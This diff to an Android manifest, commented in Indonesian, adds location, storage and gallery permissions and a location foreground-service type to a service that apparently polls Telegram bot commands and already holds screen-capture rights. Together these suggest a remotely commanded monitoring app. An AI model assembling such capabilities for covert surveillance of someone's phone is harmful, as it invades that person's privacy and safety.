@@ -8,6 +8,12 @@
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <!-- Akses galeri: READ_EXTERNAL_STORAGE (Android ≤ 12), READ_MEDIA_IMAGES (Android 13+) -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
 
     <application
         android:name=".App"
@@ -32,7 +38,7 @@
         <!-- Foreground service untuk polling perintah bot -->
         <service
             android:name=".TelegramService"
-            android:foregroundServiceType="mediaProjection|dataSync"
+            android:foregroundServiceType="mediaProjection|dataSync|location"
             android:exported="false" />
     </application>
 
